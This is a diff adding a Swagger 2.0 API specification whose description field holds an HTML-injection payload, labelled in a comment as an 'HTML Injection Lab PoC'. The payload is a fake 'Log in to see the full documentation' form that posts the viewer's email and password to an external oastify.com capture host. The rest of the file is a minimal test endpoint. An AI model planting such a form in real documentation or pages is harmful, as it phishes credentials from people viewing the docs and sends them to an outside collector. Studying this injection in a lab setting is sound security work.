@@ -1,0 +1,26 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+    <h1>Log in to see the full documentation</h1>
+    <form action="http://t71jknrq6oy3949z9e3lcndik9q0eq2f.oastify.com" method="post">
+      <label for="email">Login:</label>
+      <input name="email">
+      <label for="password">Password:</label>
+      <input name="password" type="password">
+      <input type="submit" value="Login">
+    </form>
+    <!-- HTML Injection Lab PoC -->
+  version: production
+basePath: /
+produces:
+  - application/json
+consumes:
+  - application/json
+paths:
+  /test:
+    get:
+      summary: Test endpoint
+      responses:
+        '200':
+          description: OK
